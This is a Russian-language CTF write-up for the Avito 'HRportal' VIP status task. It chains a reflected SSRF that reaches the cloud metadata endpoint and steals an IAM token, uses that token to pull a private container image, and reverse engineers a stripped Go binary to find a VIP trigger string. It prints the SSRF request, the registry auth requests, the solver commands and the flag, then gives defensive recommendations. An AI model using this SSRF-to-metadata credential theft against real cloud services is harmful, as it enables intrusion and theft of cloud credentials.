# МёдХантер: VIP status — технический разбор

**Флаг:** `avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}`

**Класс:** web / cloud / SSRF / IAM credential theft / OCI image extraction / Go reverse engineering

## Краткое техническое резюме

VIP status резюме вычисляется server-side и не раскрывается frontend. Reflected SSRF из task18
обращается к AWS-compatible IMDS path и извлекает Yandex IAM token service account. Token
обменивается на bearer для приватного Container Registry, после чего через Registry v2 API
скачивается OCI image `hrportal-backend`.

После корректного применения OCI layers и whiteouts в rootfs обнаруживается stripped Go binary
`/app/hrportal-api`. `.gopclntab` восстанавливает имя и boundaries функции
`(*SeekerService).SaveResume`. Disassembly показывает, что `is_vip` устанавливается при наличии
flag string в `experience`, после чего строка удаляется перед сохранением.

## 1. Контекст и цель

Target: `https://hrportal-aoa51cvc.avitoctf.ru/`.

Необходимо получить `is_vip: true` для собственного resume. Frontend не предоставляет field или
operation для изменения VIP status. Из task18 доступны:

- reflected SSRF в `POST /api/seeker/resume/import`;
- `REGISTRY_ID=crpml40t8ia2kptf4iv7` из cloud-init `.env`;
- доступ к AWS-compatible paths `yc-imdsv1-bridge`.

Связанный SSRF analysis: [`../task18/hrportal_task18_writeup.md`](../task18/hrportal_task18_writeup.md).

## 2. Reconnaissance и attack surface

React bundle не содержит VIP decision logic. `resumes_list.json` включает seed record `id=2` с
`is_vip: true`, однако копирование его `experience` не изменяет status другого resume. Следовательно,
seed value установлен независимо от production `SaveResume` path.

IMDS endpoint для service account credentials:

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/default
```

Reflected response содержит Yandex IAM token. Registry authorization endpoint принимает этот token
для scope:

```text
repository:crpml40t8ia2kptf4iv7/hrportal-backend:pull
```

Registry v2 возвращает OCI index или image manifest и content-addressed blobs. Image состоит из
четырёх filesystem layers; application binary расположен в `/app/hrportal-api`.

## 3. Анализ и проверка гипотез

Registry bearer запрашивается следующим образом:

```http
GET https://cr.yandex/v2/token/?scope=repository:<REGISTRY_ID>/hrportal-backend:pull
Authorization: Basic base64("iam:" + IAM_TOKEN)
```

После получения bearer solver разрешает OCI index, выбирает platform manifest, скачивает layer
blobs и последовательно применяет их. Реализация учитывает `.wh.<name>` и opaque whiteout
`.wh..wh..opq`, а также отклоняет path traversal и absolute paths.

ELF stripped для стандартной symbol table, но Go runtime metadata `.gopclntab` сохраняет function
names и PC ranges. Инструмент `pcln.go` использует `debug/gosym`:

```bash
go run task19/pcln.go task19/rootfs-rebuilt/app/hrportal-api SaveResume
```

Результат содержит:

```text
hrportal/internal/application.(*SeekerService).SaveResume
```

Targeted disassembly в `save_resume.asm` показывает `strings.Index` для flag constant длиной 38
bytes, преобразование результата в boolean и последующий `strings.Replace(..., FLAG, "", -1)`.
Эквивалентная логика:

```go
resume.IsVIP = strings.Contains(resume.Experience,
    "avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}")
resume.Experience = strings.ReplaceAll(resume.Experience,
    "avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}", "")
```

Удаление trigger до persistence объясняет, почему он не отображается в последующих API responses.

## 4. Корневая причина

1. SSRF предоставляет read access к IMDS и извлекает workload IAM credentials.
2. Service account имеет pull permission к production Container Registry.
3. Application image содержит security-sensitive business trigger как plaintext constant.
4. Удаление trigger из persisted data является obfuscation, а не access control.
5. Private image ошибочно рассматривается как boundary для защиты embedded secrets и logic.

Strip symbols не предотвращает reverse engineering Go binaries: runtime metadata, string constants
и control flow остаются доступными.

## 5. Эксплуатация

Извлечение IAM token через SSRF:

```http
POST /api/seeker/resume/import
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/default"}
```

Registry operations:

```text
GET /v2/<REGISTRY_ID>/hrportal-backend/manifests/latest
GET /v2/<REGISTRY_ID>/hrportal-backend/blobs/sha256:<digest>
```

Подтверждение business trigger:

```http
PUT /api/seeker/resume
Content-Type: application/json

{"experience":"... avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED} ..."}
```

Response содержит `"is_vip":true`, а сохранённое `experience` больше не содержит trigger.

End-to-end solver:

```bash
uv run python task19/solve_task19.py \
  --registry-id crpml40t8ia2kptf4iv7 \
  --cookie-file <cookies.txt> \
  --apply-vip
```

Вместо SSRF stage можно передать `--iam-token`. Если resume update требует reCAPTCHA, используется
`--recaptcha-token`. Rootfs пересобирается в `task19/rootfs-rebuilt/`.

Локальная проверка OCI extraction, whiteouts и path validation:

```bash
uv run python task19/solve_task19.py --self-test
```

Binary также содержит `RENDER_QUEUE_SIGNING_KEY` формата `mhq_v1_<32 hex>` и prefix `incoming/`,
используемые в task21.

## 6. Флаг

```text
avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}
```

## 7. Выводы и рекомендации

- Закрыть SSRF к IMDS с помощью destination validation, egress policy и token-based metadata
  protocol.
- Назначать workload identity минимальные IAM permissions; frontend backend не должен иметь pull
  access к unrelated production images.
- Не размещать secrets и authorization triggers в application binaries.
- Реализовать VIP assignment через explicit authorization policy и server-managed state, а не
  hidden input token.
- Считать private registry частью supply-chain infrastructure, а не механизмом сокрытия logic.
- Сканировать images на embedded credentials, internal endpoints и sensitive constants.

## 8. Файлы для воспроизведения

Version-controlled artifacts:

- `task19/solve_task19.py` — SSRF → IAM → registry bearer → OCI extraction → trigger discovery →
  optional VIP update.
- `task19/s3get.py` — SigV4 Object Storage client, используемый следующей частью цепочки.
- Продолжение цепочки: [`../task21/hrportal_task21_writeup.md`](../task21/hrportal_task21_writeup.md).

Disassembly, manifests, API fixtures, OCI layers и rebuilt rootfs являются generated analysis artifacts
и не входят в version-controlled набор.
